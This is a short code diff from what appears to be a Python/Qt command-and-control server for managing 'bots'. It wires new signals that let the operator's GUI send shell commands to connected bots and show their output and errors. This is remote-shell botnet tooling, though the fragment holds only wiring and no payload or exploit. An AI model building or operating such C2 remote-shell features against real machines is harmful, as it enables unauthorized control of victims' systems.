@@ -115,6 +115,10 @@ class Main(QObject):
         self.c2server.task.connect(self.gui_server.on_bot_task)
         self.c2server.info.connect(self.gui_server.on_bot_info)
 
+        self.c2server.shell_output.connect(self.gui_server.on_shell_output)
+        self.c2server.shell_error.connect(self.gui_server.on_shell_error)
+        self.gui_server.run_shell.connect(self.c2server.run_shell)
+
         self.logger.info("Starting C2 server")
         self.c2server.start(config.get("c2_ip"), config.get("c2_port"))
         self.c2server.setJSONDecoder(MessageDecoder)
